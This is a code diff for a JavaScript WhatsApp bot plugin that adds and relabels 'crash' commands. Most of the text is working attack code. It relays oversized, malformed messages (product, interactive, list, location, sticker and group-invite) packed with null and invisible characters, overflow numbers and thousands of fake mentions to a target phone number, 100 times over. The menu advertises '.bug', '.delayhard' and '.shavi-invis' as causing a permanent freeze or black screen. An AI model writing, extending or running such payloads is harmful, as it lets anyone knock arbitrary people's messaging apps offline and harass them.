@@ -3,7 +3,6 @@ const crypto = require('crypto');
 const axios = require('axios');
 const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
 
-// fallback for different Baileys versions
 if (!generateWAMessageFromContent) {
     try { generateWAMessageFromContent = require('@adiwajshing/baileys').generateWAMessageFromContent; } catch(e) {}
 }
@@ -25,20 +24,104 @@ function getTarget(args, from, reply, cmdName) {
     return args[0].replace(/[^\d]/g, '') + '@s.whatsapp.net';
 }
 
-// ==================== SAFE CRASH FUNCTIONS (No undefined variables) ====================
+// ==================== LAYER 1: 100 MIXED PAYLOADS (ORIGINAL ttaas) ====================
+async function ttaas(conn, target) {
+    const imageMessage = {
+        url: "https://mmg.whatsapp.net/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0&mms3=true",
+        mimetype: "image/jpeg", fileSha256: "PWTAJAHWUO0xqO802IsTrNwx8j5QN1eD+sT3gpUTWis=",
+        fileLength: "93217", caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(90000),
+        height: 1080, width: 1080, mediaKey: "QOByaM/siGh1h0k1sWbG69l7wHUgSR0tyCaUaKYal/0=",
+        fileEncSha256: "AljbB1V/hf9gKsEzoeu2s+GvEa41VXy9MrKkj8Tea54=",
+        directPath: "/v/t62.7118-24/691736887_988325427048309_788682993847765619_n.enc?ccb=11-4&oh=01_Q5Aa4gHmdgqbOLGYp2Ck_IhKprwM9Kkqvv89EH2eJBknWSr9Fg&oe=6A23B5DE&_nc_sid=5e03e0",
+        mediaKeyTimestamp: "1778142659",
+        jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEMAQwMBIgACEQEDEQH/xAAxAAACAwEBAAAAAAAAAAAAAAAABQIDBAEGAQADAQEBAAAAAAAAAAAAAAABAgMEAAX/2gAMAwEAAhADEAAAAFZVLWlw00o3nRytIp7XNukVhFljGyLaGiZshrmIx0VpmuoTKj2WhPDIzdZcSFeTaj5GCX0anU+crLr3YtlJnkVbHIs0WvJZ5zqv0JAiN2+oPLsdCo5iDQvbQskAOP8A/8QAKRAAAgIBAwMDAwUAAAAAAAAAAQIAAxEEEjEFEyEQIkEyQlEVJGJjgf/aAAgBAQABPwAVDC+ftzGXaASZ21IJEtoC4wfOItLMAYaTlgDxGq2qpgpJ4InYs+BFtbA8/GIzsy4z7ROmaWu6nc8s6ZU/G4S3Q3qgVCCBLK9TUT7DDbZn3GC47s/ENrn7pUoapeOYaqxnJnSyvZIWZjWL8ibAROorSlyAKJhd3EPJml6UXoR+5yIei/3TR6a7Ru27yk3K2I2xQW/An6rYG+jwDNVd3rWfMyfzBWZoz+2oH8IxAxky4qK28yjd3PrIWPe+9kx4A5lGkazd5GzM1PSgRmnmds1sVcYI9NPqMVUjPCy+6250Ss+7MGmtIBts/wAEr2G4gTXFaqjtHkyjXvVZmJr6GXduxNbctzhwuJkyq1gFmn1Ypt3sI+vFnhZTaUs3ZmrtDEnubQR5Bh5iHEMzF4E5Mb2qB8zdXRp6bAuXM1dj2OCy49BNntBhhrQrWcfaIyKpBAmoABTH4lzE11D4xLfOnQn0EFjAY9P/xAAhEQACAQQCAgMAAAAAAAAAAAAAAQIDERIxISIQEwQyUf/aAAgBAgEBPwCOSSux1LPZm2d2jv8AqMlx2J7414jHXO14weyq8IXTIeyTRTbysyx0aSKsfZdJ8I+PTcaey6iXLsp/QpbGk/H/xAAfEQACAgIBBQAAAAAAAAAAAAAAAQIRAxIxISIyQWL/2gAMAwEAAhEDEQA/AMGK6Uqdtd0DM9/kdpOUoy24YxvFS8ZD5H7MJ1//Z",
+        contextInfo: { pairedMediaType: "NOT_PAIRED_MEDIA", isQuestion: true, isGroupStatus: true },
+        scansSidecar: "3NpVPzuE+1LdqIuSDFHtXfXBR8TlDe+Tjjy/DWFOO9mcOpvyS9jbkQ==",
+        firstScanLength: 9999999999999999999,
+        scanLengths: [9999999999999999999, 9999999999999999999, 9999999999999999999, 9999999999999999999],
+        midQualityFileSha256: "S8DxhY6+3htsmT0dCFsMkMqjoty3gkgOXAZCCft5V9U="
+    };
 
-// 1. VerloadForceDelMsg – malformed interactive + self‑delete (safe)
+    for (let i = 0; i < 100; i++) {
+        // Product message
+        const productMsg = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    productMessage: {
+                        product: {
+                            productImage: imageMessage, productId: "449756950375071",
+                            title: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "\u0000".repeat(50000),
+                            description: "MY Bad" + "\u2060".repeat(60000),
+                            priceAmount1000: { low: 999999999, high: 999999999, unsigned: true },
+                            url: "wa.me/status", productImageCount: 9999999, firstImageId: "9999999999",
+                            salePriceAmount1000: { low: 999999999, high: 999999999, unsigned: true }
+                        }, businessOwnerJid: "13135550002@s.whatsapp.net"
+                    }
+                }
+            }
+        }, {});
+        await conn.relayMessage(target, productMsg.message, {});
+
+        // Interactive message
+        const interactiveMsg = generateWAMessageFromContent(target, {
+            interactiveMessage: {
+                header: { title: "\u0000".repeat(90000), hasMediaAttachment: true },
+                body: { text: "\u2060".repeat(80000) }, footer: { text: "\u0000".repeat(90000) },
+                nativeFlowMessage: { messageParamsJson: "\u0000".repeat(1500000) },
+                contextInfo: { mentionedJid: Array.from({ length: 2000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`) }
+            }
+        }, {});
+        await conn.relayMessage(target, interactiveMsg.message, {});
+
+        // List message
+        const listMsg = generateWAMessageFromContent(target, {
+            listMessage: {
+                title: "🔥 CRASH 🔥" + "\u0000".repeat(920000), footerText: "Xeon Bug" + "\u2060".repeat(50000),
+                description: "Xeon Bug" + "\u0000".repeat(50000), buttonText: null, listType: 2,
+                productListInfo: { productSections: [{ title: "bug", products: [{ productId: "4392524570816732" }] }], businessOwnerJid: "0@s.whatsapp.net" }
+            }
+        }, {});
+        await conn.relayMessage(target, listMsg.message, {});
+
+        // Live location message
+        const locationMsg = generateWAMessageFromContent(target, {
+            viewOnceMessage: {
+                message: {
+                    liveLocationMessage: {
+                        degreesLatitude: "p".repeat(50000), degreesLongitude: "p".repeat(50000),
+                        caption: "丂卄卂ᐯ丨ㄚ卂 - 千ㄩ匚Ҝ ㄚㄖㄩ" + "ꦾ".repeat(80000),
+                        sequenceNumber: "0", jpegThumbnail: ""
+                    }
+                }
+            }
+        }, {});
+        await conn.relayMessage(target, locationMsg.message, {});
+
+        // Sticker message
+        const stickerMsg = generateWAMessageFromContent(target, {
+            stickerMessage: {
+                url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4",
+                fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
+                fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
+                mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
+                mimetype: "image/webp", fileLength: "9999999999999999999", isAnimated: false,
+                contextInfo: { mentionedJid: [target, ...Array.from({ length: 1000 }, () => `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`)] }
+            }
+        }, {});
+        await conn.relayMessage(target, stickerMsg.message, {});
+    }
+}
+
+// ==================== LAYER 2: VerloadForceDelMsg ====================
 async function verloadForceDelMsg(conn, target) {
     const VaxzyXx = JSON.stringify({ status: true, criador: "VerloadXApiBug", resultado: { type: "md", ws: { _eventsCount: 800000 } } });
     const msg = generateWAMessageFromContent(target, {
         viewOnceMessage: {
             message: {
                 interactiveMessage: {
-                    contextInfo: {
-                        expiration: 1, ephemeralSettingTimestamp: 1,
+                    contextInfo: { expiration: 1, ephemeralSettingTimestamp: 1,
                         disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
-                        participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: [target]
-                    },
+                        participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: [target] },
                     body: { text: "Hi I'm Vaxzy!!" + "ោ៝".repeat(10000) },
                     nativeFlowMessage: {
                         messageParamsJson: "{".repeat(20000),
@@ -54,20 +137,17 @@ async function verloadForceDelMsg(conn, target) {
     await conn.relayMessage(target, msg.message, { participant: { jid: target } });
 }
 
-// 2. BlankVVIP – group invite overflow (safe)
+// ==================== LAYER 3: BlankVVIP ====================
 async function blankVVIP(conn, target) {
     const MSG = {
         groupInviteMessage: {
             groupJid: "120363370626418572@g.us", inviteCode: "Xx".repeat(10000), inviteExpiration: "99999999999",
             groupName: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(77777),
             caption: "ោ៝".repeat(10000) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
-            contentText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
-            displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
-            contextInfo: {
-                expiration: 1, ephemeralSettingTimestamp: 1,
+            contentText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000), displayText: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(9000),
+            contextInfo: { expiration: 1, ephemeralSettingTimestamp: 1,
                 disappearingMode: { initiatorDeviceJid: target, initiator: "INITIATED_BY_OTHER", trigger: "UNKNOWN_GROUPS" },
-                participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: "0@s.whatsapp.net"
-            },
+                participant: "0@s.whatsapp.net", remoteJid: target, mentionedJid: "0@s.whatsapp.net" },
             body: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌" + "ោ៝".repeat(10450) + "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(32901) + "@1".repeat(50000) },
             footer: { text: "⎋ 𝗛𝗘𝗟𝗟𝗕𝗢𝗬 𝗞𝗜𝗟𝗟‌".repeat(5000) },
             nativeFlowMessage: { messageParamJson: "{".repeat(25000) },
@@ -82,7 +162,7 @@ async function blankVVIP(conn, target) {
     await conn.relayMessage(target, MSG, { participant: { jid: target } });
 }
 
-// 3. invico1 – newsletter admin invite (safe)
+// ==================== LAYER 4: invico1 (newsletter) ====================
 async function invico1(conn, target) {
     const msg = {
         newsletterAdminInviteMessage: {
@@ -95,7 +175,7 @@ async function invico1(conn, target) {
     await conn.relayMessage(target, msg, { participant: { jid: target } });
 }
 
-// 4. Uinew – malformed interactive with huge text + location (safe)
+// ==================== LAYER 5: Uinew ====================
 async function uinew(conn, target) {
     const ameliaMsg = {
         interactiveMessage: {
@@ -120,7 +200,7 @@ async function uinew(conn, target) {
     await conn.relayMessage(target, ameliaMsg, {});
 }
 
-// 5. uiKiller – location message with massive name/address (safe)
+// ==================== LAYER 6: uiKiller ====================
 async function uiKiller(conn, target) {
     const locationMsg = {
         locationMessage: {
@@ -140,7 +220,7 @@ async function uiKiller(conn, target) {
     await conn.relayMessage(target, locationMsg, {});
 }
 
-// 6. frezeui – buttonsMessage with massive content + malformed quoted (safe)
+// ==================== LAYER 7: frezeui ====================
 async function frezeui(conn, target) {
     const buttonsMsg = {
         viewOnceMessage: {
@@ -169,17 +249,15 @@ async function frezeui(conn, target) {
     await conn.relayMessage(target, buttonsMsg, {});
 }
 
-// 7. ForceXsystem – interactive with 11 buttons, huge params (safe)
+// ==================== LAYER 8: ForceXsystem ====================
 async function forceXsystem(conn, target) {
     const message = {
         viewOnceMessage: {
             message: {
                 messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                 interactiveMessage: {
-                    contextInfo: {
-                        mentionedJid: [target], isForwarded: true, forwardingScore: 99999999,
-                        businessMessageForwardInfo: { businessOwnerJid: target }
-                    },
+                    contextInfo: { mentionedJid: [target], isForwarded: true, forwardingScore: 99999999,
+                        businessMessageForwardInfo: { businessOwnerJid: target } },
                     body: { text: "Tiada Hidup Dengan Kebahagiaan" + "ꦾ".repeat(35000) },
                     nativeFlowMessage: {
                         messageParamsJson: "{".repeat(15000),
@@ -204,7 +282,7 @@ async function forceXsystem(conn, target) {
     await conn.relayMessage(target, message, { participant: { jid: target } });
 }
 
-// 8. BlankUi – image with massive dimensions + buttons (safe)
+// ==================== LAYER 9: BlankUi ====================
 async function blankUi(conn, target) {
     const ameliaMsg = {
         viewOnceMessage: {
@@ -242,9 +320,10 @@ async function blankUi(conn, target) {
     await conn.relayMessage(target, ameliaMsg, { participant: { jid: target } });
 }
 
-// ==================== COMBINED .bug COMMAND ====================
+// ==================== MASTER COMBO ====================
 async function comboBugCrash(conn, target) {
     const modules = [
+        { name: "ttaas (100 payloads)", fn: ttaas },
         { name: "verloadForceDelMsg", fn: verloadForceDelMsg },
         { name: "blankVVIP", fn: blankVVIP },
         { name: "invico1", fn: invico1 },
@@ -287,8 +366,10 @@ async function delayHardCrash(conn, target) {
                     fileSha256: "n9ndX1LfKXTrcnPBT8Kqa85x87TcH3BOaHWoeuJ+kKA=",
                     fileEncSha256: "zUvWOK813xM/88E1fIvQjmSlMobiPfZQawtA9jg9r/o=",
                     mediaKey: "ymysFCXHf94D5BBUiXdPZn8pepVf37zAb7rzqGzyzPg=",
-                    mimetype: "image/webp", directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
-                    fileLength: { low: 999, high: 0, unsigned: true }, mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
+                    mimetype: "image/webp",
+                    directPath: "/v/t62.43144-24/10000000_2012297619515179_5714769099548640934_n.enc?ccb=11-4&oh=01_Q5Aa1gEB3Y3v90JZpLBldESWYvQic6LvvTpw4vjSCUHFPSIBEg&oe=685F4C37&_nc_sid=5e03e0",
+                    fileLength: { low: 999, high: 0, unsigned: true },
+                    mediaKeyTimestamp: { low: 1746112211, high: 0, unsigned: false },
                     firstFrameLength: 19904, firstFrameSidecar: "KN4kQ5pyABRAgA==", isAnimated: true,
                     contextInfo: { participant: target, mentionedJid: mentionedList },
                     stickerSentTs: { low: -1939477883, high: 555, unsigned: false }
@@ -302,13 +383,13 @@ async function delayHardCrash(conn, target) {
 // ==================== COMMANDS ====================
 cmd({
     pattern: "bug",
-    desc: "💀 COMBO CRASH – 8 extreme payloads (permanent freeze / black screen)",
+    desc: "💀 COMBO CRASH – 9 layers (100 payloads + 8 exploits) – permanent freeze",
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply, args }) => {
     const target = getTarget(args, from, reply, "bug");
     if (!target) return;
-    await reply(`💀 *SHAVIYA XMD COMBO CRASH* → ${target}\n_Running 8 crash modules..._`);
+    await reply(`💀 *SHAVIYA XMD COMBO CRASH* → ${target}\n_Running 9 crash modules..._`);
     try {
         await comboBugCrash(conn, target);
         const successImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/813.jpg");
@@ -375,7 +456,7 @@ cmd({
     category: "tools",
     filename: __filename
 }, async (conn, mek, m, { from, reply }) => {
-    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug         : 💀 COMBO CRASH (8 modules – permanent freeze)*\n*│ 📌 .shavi-invis : 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard   : 💀 Extreme delay (sticker bomb)*\n*╰──────────────●●►*\n> 💡 *Usᴀɢᴇ:* .bug 947XXXXXXXXX\n> ⚠️ *Extreme power – use only on numbers you own.*`;
+    const menuText = `*╭─「 👑 Sʜᴀᴠɪʏᴀ Xᴍᴅ Cʀᴀsʜ Mᴇɴᴜ 」─*\n*│ 📌 .bug         : 💀 9‑LAYER COMBO (100 payloads + 8 exploits)*\n*│ 📌 .shavi-invis : 🔮 Invisible crash (no text)*\n*│ 📌 .delayhard   : 💀 Extreme sticker bomb*\n*╰──────────────●●►*\n> 💡 *Usᴀɢᴇ:* .bug 947XXXXXXXXX\n> ⚠️ *Extreme power – use only on numbers you own.*`;
     const menuImg = await getImageBuffer("https://whiteshadow-uploader.vercel.app/files/nsa.jpg");
     if (menuImg) {
         await conn.sendMessage(from, { image: menuImg, caption: menuText });
